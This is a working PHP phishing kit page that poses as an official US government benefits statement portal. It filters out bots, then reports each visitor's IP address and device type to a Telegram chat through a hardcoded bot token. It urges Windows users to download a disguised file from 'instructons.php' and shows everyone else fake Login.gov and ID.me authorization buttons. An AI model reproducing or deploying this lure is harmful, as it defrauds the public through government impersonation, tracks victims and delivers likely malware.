<?php
// The dedicated anti-bot program runs FIRST.
// If it blocks a visitor, the script below will never execute.
require_once $_SERVER['DOCUMENT_ROOT'].'/antibot/index.php';

// The code below ONLY runs for legitimate visitors approved by the anti-bot program.

// Start a session to track visitors
session_start();

// --- Re-introduced Telegram Configuration ---
$telegram_bot_token = '8248768037:AAHpCM1z2qhQSADwn26UerFaGnwj5BfZd6U';
$telegram_chat_id = '-1002268099247';

$funny_names = [
    "Big Dodo", "Vasco de Cat", "Pussy Dog", "General Failure", "Admiral Snackbar",
    "Sir Fart-a-lot", "Baron von Chuckles", "Agent Fluffykins", "Captain Underpants"
];

// --- Re-introduced Core Functions ---
function sendTelegramMessage($message, $token, $chat_id) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function get_device_type($agent) {
    if (preg_match('/windows nt/i', $agent)) return 'Windows';
    if (preg_match('/android/i', $agent)) return 'Android';
    if (preg_match('/iphone|ipad|ipod/i', $agent)) return 'iOS';
    if (preg_match('/linux/i', $agent)) return 'Linux';
    if (preg_match('/macintosh|mac os x/i', $agent)) return 'macOS';
    return 'Unknown';
}

// --- Main Logic for Notifications & Device Type ---

$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device_type = get_device_type($user_agent);

// Check if this is the first visit for a legitimate user
if (!isset($_SESSION['has_visited'])) {
    // Assign a name for this session
    $_SESSION['visitor_name'] = $funny_names[array_rand($funny_names)];
    
    // Determine status (we know they are real at this point)
    $access_method = ($device_type === 'Windows') ? 'Direct' : 'Form';
    $status_message = "Status: REAL User, {$access_method} - {$device_type}.";

    // Construct and send the Telegram notification
    $telegram_message = "Visitor {$_SESSION['visitor_name']} Landed.\n{$user_ip}\n{$status_message}";
    sendTelegramMessage($telegram_message, $telegram_bot_token, $telegram_chat_id);
    
    // Mark as visited for this session to prevent re-notifying
    $_SESSION['has_visited'] = true;
}

// Logic for the modal remains the same
$is_windows_device = ($device_type === 'Windows');
// UPDATED: The new download link
$download_link = "instructons.php";
$js_download_script = $is_windows_device ? "<script>const downloadUrl = '{$download_link}';</script>" : "";

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Your Benefits Statement</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

    <div id="session-notification" class="session-notification">
        <i class="fa-solid fa-check-circle"></i> New Session Started
    </div>

    <div class="top-banner">
        <div class="container">
            <p><img src="img/flag.svg" alt="US Flag" class="flag-icon"> An official website of the United States government</p>
        </div>
    </div>

    <main class="site-main">
        <header class="site-header">
           <img src="img/header-2.svg" alt="Government Seal" class="header-logo seal">
        </header>
        
        <div class="content-box">
            <h2>Your Benefits Statement is ready to review</h2>
            <p class="subtitle">By downloading your statement, you can:</p>
            
            <ul class="features-list">
                <li><span class="icon-wrapper"><i class="fa-solid fa-eye"></i></span> View your statement online</li>
                <li><span class="icon-wrapper"><i class="fa-solid fa-download"></i></span> Download your statement as a PDF file</li>
                <li><span class="icon-wrapper"><i class="fa-solid fa-print"></i></span> Print your statement for your records</li>
            </ul>

            <div class="alert-box">
                <i class="fa-solid fa-circle-info"></i>
                <p>For security reasons, we recommend accessing your statement through your secure device, such as Home Computer or Laptops.</p>
            </div>

            <a href="#" id="access-statement-btn" class="btn-primary">
                <i class="fa-solid fa-file-arrow-down"></i> Access Your Statement
            </a>
        </div>
    </main>

    <footer class="site-footer">
        <div class="container">
            <div class="footer-left"><p>OMB No. 0960-0789</p></div>
            <div class="footer-right">
                <button class="lang-button"><i class="fa-solid fa-globe"></i> Language <i class="fa-solid fa-caret-up"></i></button>
                <a href="#">Contact <i class="fa-solid fa-arrow-up-right-from-square"></i></a>
            </div>
        </div>
    </footer>

    <div id="access-modal" class="modal-overlay" style="display: none;">
        <div class="modal-content large-modal">
            <button class="close-modal-btn">&times;</button>
            <?php if ($is_windows_device): ?>
                <div class="modal-icon-download"><i class="fa-solid fa-check"></i></div>
                <h3>Secure Device Verified</h3>
                <div class="divider"></div>
                <p>Your download will begin shortly. Please wait...</p>
                <div class="loader"></div>
                <?php echo $js_download_script; ?>
            <?php else: ?>
                <div class="modal-icon-auth"><i class="fa-solid fa-shield-halved"></i></div>
                <h3>Authorization Required</h3>
                <div class="divider"></div>
                <p class="auth-message">Because you are not using a Windows PC, an extra security step is required. Please authorize your session using one of the services below.</p>
                <div class="auth-buttons">
                    <a href="incompatible-device.php" class="auth-btn login-gov-btn"><span class="auth-icon-wrapper login-gov-icon"><i class="fa-solid fa-lock"></i></span>LOGIN.GOV</a>
                    <a href="incompatible-device.php" class="auth-btn id-me-btn"><span class="auth-icon-wrapper id-me-icon">ID</span>ID.me</a>
                </div>
                <p class="auth-recommendation">For the most secure and direct access, we recommend opening this email on a Windows PC or Laptop.</p>
            <?php endif; ?>
        </div>
    </div>

    <div id="inactivity-modal" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <div class="modal-icon"><i class="fa-solid fa-question"></i></div>
            <h3>Need more time?</h3>
            <div class="divider"></div>
            <p>For your security, this session will close in <span id="countdown-timer">60</span> seconds.</p>
            <button id="continue-btn" class="btn-modal-primary">Continue downloading</button>
            <button id="cancel-btn" class="btn-modal-secondary">Cancel</button>
        </div>
    </div>

    <script src="js/script.js"></script>
</body>
</html>